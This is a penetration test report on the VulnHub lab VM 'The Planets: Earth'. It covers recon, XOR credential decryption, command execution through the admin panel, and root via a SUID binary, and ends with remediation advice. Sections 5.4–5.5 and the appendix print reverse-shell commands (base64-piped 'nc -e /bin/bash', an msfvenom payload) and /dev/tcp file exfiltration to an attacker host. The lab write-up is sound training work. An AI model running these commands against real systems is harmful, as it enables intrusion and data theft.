# Penetration Test Report — VulnHub: The Planets — *Earth*

**Author:** Malinga Samarakoon
**Date:** 2025-09-20
**Target:** VulnHub VM — *The Planets: Earth* (lab)
**Tester:** Malinga Samarakoon

---

## Table of Contents

1. Executive Summary
2. Scope & Rules of Engagement
3. Tools & Environment
4. Methodology
5. Detailed Findings & Proof-of-Concept (PoC)

   * Reconnaissance
   * Web Enumeration
   * Credential Recovery
   * Gaining a Shell
   * Privilege Escalation
   * Post-Exploitation
6. Risk Ratings & Recommendations
7. Evidence & Artifacts (attachments / placeholders)
8. Timeline & Deliverables
9. Lessons Learned
10. Appendix — Commands & Scripts

---

## 1. Executive Summary

This document is a full technical project overview and penetration test report for the VulnHub virtual machine **The Planets: Earth**. The objective of this engagement was to enumerate, exploit, and capture the user and root flags in a contained lab environment. The test combined automated scanning (Nessus, Nmap) and manual exploitation (Burp Suite, CyberChef, Metasploit, Netcat) to compromise the system.

**Result:** Full compromise achieved. User flag retrieved from `/var/earth_web/` and root obtained by exploiting a misconfigured/unsafe SUID binary (`/usr/bin/reset_root`) which ultimately reset the root password to `Earth`.

**High-level issues discovered:**

* Sensitive hostnames leaked in SSL certificate (recon aid).
* Weak secret handling (XOR encrypted content with key accessible on host).
* Admin web interface permitted command execution or pipeline leading to remote code execution.
* Presence of a privileged binary (`reset_root`) that could be manipulated to reset root password (local privilege escalation).

---

## 2. Scope & Rules of Engagement

**Scope:** Single VM in a lab environment — *Earth* at 192.168.10.13 (example). All testing conducted locally against this instance only.

**Allowed actions:** Active scanning, web probing, authenticated exploitation, local file manipulation on the target VM, binary exfiltration for analysis, reverse shells.

**Forbidden:** Actions affecting other hosts, pivoting to third-party infrastructure, or any destructive actions beyond the lab scope.

**Assumptions:** The VM was hosted in an isolated environment and the tester had administrative rights on the attacking workstation.

---

## 3. Tools & Environment

**Attacker platform:** Kali Linux (or equivalent)
**Target IP (lab example):** `192.168.10.13`

**Tools used:**

* Recon & Scanning: `netdiscover`, `nmap`
* Vulnerability Scanning: **Nessus**
* Web discovery & manipulation: `dirb`, **Burp Suite**, browser (SSL cert inspection)
* Crypto/decode: **CyberChef** (or local XOR script)
* Exploitation & payloads: `nc` (netcat), `msfvenom` / **Metasploit** (multi/handler)
* Binary analysis: `file`, `ltrace`
* Utilities: `base64`, `cat`, `touch`, `find`
* Documentation: Markdown, screenshots, saved terminal logs

---

## 4. Methodology

We followed a standard pentest methodology:

* **Reconnaissance:** Network discovery and port/service enumeration.
* **Vulnerability scanning:** Nessus to identify obvious misconfigurations and exposures.
* **Web enumeration:** Directory fuzzing and manual analysis of web app behavior.
* **Credential discovery:** Find and decrypt secret materials.
* **Exploitation:** Use recovered credentials and web functionality to gain initial execution.
* **Post-exploitation:** Establish interactive shells (reverse shell), enumerate for privilege escalation opportunities.
* **Privilege escalation:** Identify SUID binaries and misuse to gain root.
* **Reporting & remediation:** Document findings, risk ratings, and recommended fixes.

---

## 5. Detailed Findings & Proof-of-Concept (PoC)

> **Note:** Replace `192.168.10.13` and `192.168.10.10` with your actual lab IPs when reproducing.

### 5.1 Reconnaissance

Commands and outcomes (example):

```bash
netdiscover -r 192.168.10.0/24
# discovered: 192.168.10.13 (Earth VM)

nmap -sV -p- -v 192.168.10.13
# open ports: 22/tcp (ssh), 80/tcp (http), 443/tcp (https)
```

Nessus scan was run against the target and flagged certificate SANs exposing `earth.local` and `terratest.earth.local`, plus common server banners.

**Impact:** Certificate SANs and banners increased the success of host-based virtual host discovery.

---

### 5.2 Web Enumeration

Initial `dirb` against the raw IP returned little useful information except `/cgi-bin`.

Visiting `https://192.168.10.13` in the browser returned a Fedora admin page. Inspecting the SSL certificate SANs revealed the hostnames `earth.local` and `terratest.earth.local`.

Add hostnames to `/etc/hosts` on the attacker machine:

```bash
sudo sh -c 'echo "192.168.10.13 earth.local" >> /etc/hosts'
sudo sh -c 'echo "192.168.10.13 terratest.earth.local" >> /etc/hosts'
```

Run directory enumeration for the hostnames:

```bash
dirb http://earth.local
dirb https://terratest.earth.local
```

Observed interesting paths:

* `earth.local` → `/admin` (login panel)
* `terratest.earth.local` → `/robots.txt`, `/testingnotes.txt`, `/testdata.txt`, `/index.html`

Open `/robots.txt` → references `testingnotes.txt`. `testingnotes.txt` hints that XOR encryption is used and `testdata.txt` contains the test key.

**Impact:** Publicly accessible test files contained encryption keys and hints that directly led to credential disclosure.

---

### 5.3 Credential Recovery (Decrypting site messages)

The main `earth.local` page displayed encrypted messages. The key file `testdata.txt` was accessible via `terratest.earth.local/testdata.txt`.

Procedure:

1. Copy the encrypted strings from the `earth.local` landing page.
2. Copy the contents of `testdata.txt` (the XOR key).
3. Use **CyberChef**: `Input` → `XOR` operation with key set to contents of `testdata.txt`.
4. Result: plaintext containing a password (used with username `terra`).

Evidence: Attach CyberChef recipe screenshot and decrypted plaintext in Evidence section.

---

### 5.4 Gaining a Shell (via admin web panel)

Use credentials (e.g., `terra:<password>`) to log into `http://earth.local/admin`.

The admin UI contained a CLI-like command input which permitted running shell commands (or at least executing server-side commands that allowed us to interact with the filesystem).

Extracted files and enumerated directories:

```bash
# commands issued via admin CLI
cd /home; ls -al; pwd
ls /var/earth_web/
# discovered: user flag file in /var/earth_web/
```

To obtain an interactive shell, a reverse shell was established. Two approaches were used in the engagement:

**Netcat encoded command** (works when direct outbound execution is allowed or base64 decode is available):

1. On attacker (listener): `nc -lvnp 4444`
2. Prepare reverse shell command and encode in base64 on attacker:

   ```bash
   echo 'nc -e /bin/bash 192.168.10.10 4444' | base64
   ```
3. Paste base64 string into admin CLI on the target and run:

   ```bash
   echo 'PASTE_BASE64' | base64 -d | bash
   ```

Result: target connects back to attacker netcat listener and produces a shell (user: `apache`).

**Metasploit approach:** (alternative)

1. Create payload: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.10 LPORT=4444 -f elf > shell.elf`
2. Transfer by base64 or upload via admin interface and execute.
3. Set up `multi/handler` in Metasploit to catch the session.

Evidence: Attach netcat listener transcript and Metasploit handler logs.

---

### 5.5 Privilege Escalation to Root

From interactive shell (`whoami` → `apache`), local enumeration was performed to find SUID files and other weaknesses:

```bash
find / -perm -u=s -type f 2>/dev/null
# output included: /usr/bin/reset_root
```

Direct execution failed or behaved unexpectedly — so the binary was exfiltrated for local analysis:

**Exfiltrate binary via netcat**

* On attacker: `nc -lvnp 3333 > reset_root`
* On target: `cat /usr/bin/reset_root > /dev/tcp/192.168.10.10/3333`

Analyze locally:

```bash
file reset_root
ltrace ./reset_root
```

`ltrace` displayed file operations and pointed to several missing files the binary expected to find on the target. Those files were recreated on the target (via admin shell / touch commands) with the paths discovered by `ltrace`.

After creating the expected files, re-running `/usr/bin/reset_root` on the target resulted in resetting the root password to `Earth` (as per the binary behavior). Then:

```bash
su root
# password: Earth
```

This granted a root shell and allowed reading the root flag (e.g., `/root/root.txt`).

**Impact:** Full system compromise due to insecure privileged binary.

---

### 5.6 Post-Exploitation

With root access, the following were performed to confirm ownership and to collect evidence:

* Enumerated `root` home directory and captured `root.txt` (flag).
* Checked for persistence mechanisms (no SSH keys or cron jobs were left by us; no permanent persistence found by the test).

**Note:** In a real-world engagement, persistence actions would be carefully documented and only performed if within scope and with explicit permission. In this lab, actions were limited to evidence capture.

---

## 6. Risk Ratings & Recommendations

**Summary table**

| Vulnerability                           | Severity | Likelihood | Impact                | Recommendation                                                                        |
| --------------------------------------- | -------: | ---------: | --------------------- | ------------------------------------------------------------------------------------- |
| SUID binary `reset_root` exploitable    | Critical |     Medium | Full root compromise  | Remove SUID, patch binary to validate environment, audit privileged binaries          |
| Admin panel allowing command execution  |     High |     Medium | RCE / data exposure   | Remove direct OS command capabilities, use strict auth + input validation             |
| XOR encryption with public key          |   Medium |       High | Credential disclosure | Do not expose test keys; use standard crypto and safe storage                         |
| SSL cert SANs reveal internal hostnames |      Low |       High | Easier recon          | Avoid exposing internal hostnames in public certs; use internal CA for internal names |

**General recommendations (actionable):**

1. **Remove or fix `/usr/bin/reset_root`:** If not needed, delete. If needed, remove SUID bit (`chmod 0755`) and refactor to require explicit admin authentication and robust input validation.
2. **Harden web admin interface:** Remove interactive OS-level command execution capability. Apply RBAC and strong authentication (MFA), restrict by IP, implement logging and alerting.
3. **Secure test data:** Remove development/test key files, restrict access to non-production hosts, and rotate exposed credentials.
4. **Certificate hygiene:** Ensure public-facing certificates do not list internal-only names; use separate certs for internal services.
5. **Perform SUID audits:** Periodically run `find / -perm -u=s -type f` and review for necessity.
6. **Monitoring & detection:** Implement host-based IDS/ file integrity monitoring to detect unusual file creations and execution patterns.

---

## 7. Evidence & Artifacts

Attach the following artifacts to the final report (placeholders below):

* `nmap` scan output (full)
* `Nessus` scan report (PDF or export)
* `dirb` output for `earth.local` and `terratest.earth.local`
* `robots.txt`, `testingnotes.txt`, `testdata.txt` (raw content files)
* CyberChef recipe screenshot and decrypted plaintext
* Admin panel login screenshot
* Terminal transcripts for commands used (listener, reverse shell, `find`, `ltrace`)
* `reset_root` binary saved copy, with MD5/SHA256 hashes
* `ltrace` output for `reset_root`
* Copy of `user.txt` and `root.txt` flags (evidence)

> When submitting, replace placeholders with actual screenshots and logs. Keep evidence timestamps and hashes for integrity verification.

---

## 8. Timeline & Deliverables

**Estimated timeline for this lab engagement (actual times will vary):**

* Recon & scanning: 1–2 hours
* Web enumeration & credential recovery: 1–2 hours
* Exploitation & shell: 30–60 minutes
* Privilege escalation & analysis: 1–3 hours
* Reporting & evidence collection: 2–4 hours

**Deliverables:**

* This Markdown report
* Nessus scan report
* Supporting screenshots and transcripts
* Saved `reset_root` binary and analysis logs

---

## 9. Lessons Learned

* Don’t rely on ad-hoc encryption (XOR) for protecting credentials — keys that are available on the host defeat the protection.
* SUID binaries are extremely dangerous — minimal SUID surface area is best practice.
* Certificate metadata can leak valuable operational details; check SANs during reconnaissance.
* Combining automated scanning (Nessus) and manual tooling (Burp, CyberChef, Metasploit) yields the best results.

---

## 10. Appendix — Commands & Scripts

**Hosts file**

```bash
sudo sh -c 'echo "192.168.10.13 earth.local" >> /etc/hosts'
sudo sh -c 'echo "192.168.10.13 terratest.earth.local" >> /etc/hosts'
```

**Scanning**

```bash
nmap -sV -p- -v 192.168.10.13 -oN nmap_full.txt
```

**Web discovery**

```bash
dirb http://earth.local -o dirb_earth.txt
dirb https://terratest.earth.local -o dirb_terratest.txt
curl -sS https://terratest.earth.local/robots.txt
```

**Decrypt (local XOR) using CyberChef or Python**

```python
# example XOR decryption in Python
from itertools import cycle

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

cipher = bytes.fromhex('...')  # if ciphertext hex
key = open('testdata.txt','rb').read()
print(xor_decrypt(cipher, key))
```

**Reverse shell (netcat method)**

```bash
# On attacker
nc -lvnp 4444

# Generate the string to paste on target
echo 'nc -e /bin/bash 192.168.10.10 4444' | base64

# On target (via admin CLI)
echo 'BASE64_STRING' | base64 -d | bash
```

**Metasploit payload**

```bash
# On attacker
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.10 LPORT=4444 -f elf > shell.elf
# Use multi/handler in Metasploit
```

**Exfiltrate binary via netcat**

```bash
# On attacker
nc -lvnp 3333 > reset_root
# On target (in shell)
cat /usr/bin/reset_root > /dev/tcp/192.168.10.10/3333
```

**Analyze binary**

```bash
file reset_root
ltrace ./reset_root
```

**Find SUID files**

```bash
find / -perm -u=s -type f 2>/dev/null
```

---

